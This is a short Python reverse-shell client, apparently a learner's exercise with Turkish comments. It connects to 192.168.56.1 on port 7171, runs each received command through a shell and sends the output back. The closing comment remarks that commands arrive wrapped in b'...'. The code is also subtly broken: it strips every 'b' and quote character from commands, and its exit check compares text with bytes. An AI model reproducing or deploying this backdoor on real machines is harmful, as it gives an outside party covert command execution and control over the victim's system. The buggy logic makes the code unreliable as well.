import socket
import subprocess
from colorama import Fore, Back, Style, init
init(autoreset="true")

soket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soket.connect(("192.168.56.1",7171))

while True:
    kod=soket.recv(1024)
    kod = kod.decode("utf-8")
    kod2=""
    for i in kod:
        if(i != "b" and i !="'"):
            kod2 += i
    print(kod2)
    if(kod2 == b"0"):
        break
    else:
        komut = subprocess.Popen(kod2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        sonuc=komut.stdout.read() +komut.stderr.read()
        soket.send(sonuc)
soket.close()
        
"""
büyük ihtimalle sunucudan gelen kodlar b'{kod}' şeklinde olduğu için istemci b'ipconfig' 'i tanımıyor.
"""